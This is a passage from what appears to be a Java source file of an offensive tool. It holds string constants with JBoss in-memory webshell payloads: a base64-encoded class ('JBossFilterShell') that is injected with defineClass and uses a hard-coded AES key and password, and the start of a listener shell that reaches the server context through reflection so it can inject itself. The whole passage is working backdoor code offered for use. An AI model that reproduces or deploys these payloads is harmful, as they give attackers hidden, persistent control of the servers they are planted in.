29kZXIMASsBLAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBLQCBAQAOWE1MSFRUUFJlcXVlc3QMAS4BLwwBMAExDAEyAIEMAI8AkAwAdAB1AQAHcGF5bG9hZAcBCAwBMwE0AQAZbWVtc2hlbGwvSkJvc3NGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b0J5dGVBcnJheQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAEAoTGphdmF4L3Nlc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\");\n" +
            "                byte[] var2 = base64Decode(\"yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAbTG1lbXNoZWxsL0pCb3NzRmlsdGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDxBwEGBwDFAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA3AEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBBwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBCAcBCQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAVSkJvc3NGaWx0ZXJTaGVsbC5qYXZhDABmAGcMAFwAXQwAXgBfAQAQM2M2ZTBiOGE5YzE1MjI0YQwAYABhAQAEcEFTMwwAYgBhAQAQL2Zhdmljb25kZW1vLmljbwwAYwBhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQoBCwwBDAENDABkAIEMAGQAYQEABVVURi04DABlAGEMAGYAbQwBDgEPAQADQUVTBwEGDAEQAREBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAESARMMAGYBFAwAkgEVDAEWARcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEYDAEQARkMARoBGwwBHAEdAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAR4BEwwAZgEfDAEMASAMASEBDQEAEGphdmEudXRpbC5CYXNlNjQMASIBIwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMASQBJQEAE1tMamF2YS9sYW5nL09iamVjdDsHASYMAScBKAwBKQEqAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMASsBLAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBLQCBAQAOWE1MSFRUUFJlcXVlc3QMAS4BLwwBMAExDAEyAIEMAI8AkAwAdAB1AQAQbWVtc2hlbGwucGF5bG9hZAcBCAwBMwE0AQAZbWVtc2hlbGwvSkJvc3NGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsB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\");\n" +
            "                var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "            } catch (Throwable var3) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "}\n";

    public static final String JBossListenerMemShell =
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.ArrayList;\n" +
            "import java.util.Iterator;\n" +
            "import java.util.List;\n" +
            "\n" +
            "public class JBossListenerMemShell {\n" +
            "    private static ArrayList StanderContexts = new ArrayList();\n" +
            "    static {\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "    public JBossListenerMemShell() {\n" +
            "\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "\n" +
            "\n" +
            "    public static synchronized void Inject() {\n" +
            "        getContext1();\n" +
            "        getContext();\n" +
            "        Iterator var1 = StanderContexts.iterator();\n" +
            "        while (var1.hasNext()) {\n" +
            "            Object var2 = var1.next();\n" +
            "            IMF(var2);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getContext1() {\n" +
            "        ArrayList var0 = new ArrayList();\n" +
            "        Object StandardContext = null;\n" +
            "        try {\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Thread[] threads = (Thread[]) getFV(threadGroup, \"threads\");\n" +
            "            for (Thread thread : threads) {\n" +
            "                if (thread.getName().startsWith(\"http-\")) {\n" +
            "                    Object Endpoint = null;\n" +
            "\n" +
            "                    Object tmp =  getFV(thread, \"target\");\n" +
            "                    if (tmp.getClass().getName().contains(\"PoolTcpEndpoint\")){\n" +
            "                        Endpoint = tmp;\n" +
            "                    }\n" +
            "                    else{\n" +
            "                        Endpoint = getFV(tmp, \"endpoint\");\n" +
            "                    }\n" +
            "                    Object Http11Protocol = getFV(Endpoint, \"handler\");\n" +
            "                    Object RequestGroupInof = getFV(Http11Protocol, \"global\");\n" +
            "                    List Processors = (List) getFV(RequestGroupInof, \"processors\");\n" +
            "                    for (int i = 0; i < Processors.size(); i++) {\n" +
            "                        Object RequestInfo = (Object) Processors.get(i);\n" +
            "                        Object Request = getFV(RequestInfo, \"req\");\n" +
            "                        Object Request1 = Request.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(Request, 1);\n" +
            "                        Field f4 = Request1.getClass().getDeclaredField(\"context\");\n" +
            "                        f4.setAccessible(true);\n" +
            "                        StandardContext = f4.get(Request1);\n" +
